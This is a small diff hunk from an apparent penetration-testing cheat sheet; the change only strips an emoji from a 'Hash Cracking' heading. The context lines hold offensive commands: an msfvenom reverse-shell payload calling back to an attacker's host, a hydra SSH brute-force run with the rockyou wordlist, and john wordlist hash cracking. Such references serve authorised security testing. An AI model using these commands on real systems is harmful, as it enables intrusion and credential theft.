@@ -189,7 +189,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o p
 hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target
 
 
- 🔑 Hash Cracking
+ Hash Cracking
 
 
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
